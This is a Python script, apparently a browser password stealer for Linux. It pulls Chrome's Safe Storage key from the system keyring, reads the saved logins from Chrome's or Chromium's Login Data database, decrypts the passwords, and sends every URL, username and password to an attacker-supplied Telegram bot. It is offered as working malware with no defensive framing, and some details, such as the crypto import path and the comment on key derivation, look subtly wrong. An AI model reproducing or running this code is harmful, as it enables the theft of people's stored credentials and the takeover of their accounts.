import os
import sqlite3
import json
import base64
import argparse
import requests
import secretstorage
from cryptodomex.cipher import AES

def get_master_key():
    try:
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                return item.get_secret()
    except Exception as e:
        return None
    # Default key if keyring is empty
    return b'peanuts'

def decrypt_password(buff, master_key):
    try:
        # Chrome Linux uses 16 rounds of PBKDF2 to derive the key
        # But often it uses the raw key from keyring directly
        iv = b' ' * 16
        cipher = AES.new(master_key[:16], AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(buff)
        # Remove padding
        return decrypted[:-decrypted[-1]].decode('utf-8')
    except:
        return "Error Decrypting"

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--token')
    parser.add_argument('--chatid')
    args = parser.parse_args()

    db_path = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
    if not os.path.exists(db_path):
        db_path = os.path.expanduser('~/.config/chromium/Default/Login Data')

    master_key = get_master_key()
    if not master_key:
        return

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    
    result = "--- CHROME PASSWORDS LINUX ---\n"
    for url, user, password in cursor.fetchall():
        if user:
            decrypted_pass = decrypt_password(password[3:], master_key)
            result += f"URL: {url}\nUser: {user}\nPass: {decrypted_pass}\n\n"
    
    # Gửi về Telegram
    requests.post(f"https://api.telegram.org/bot{args.token}/sendMessage", 
                  data={'chat_id': args.chatid, 'text': result})

if __name__ == "__main__":
    main()
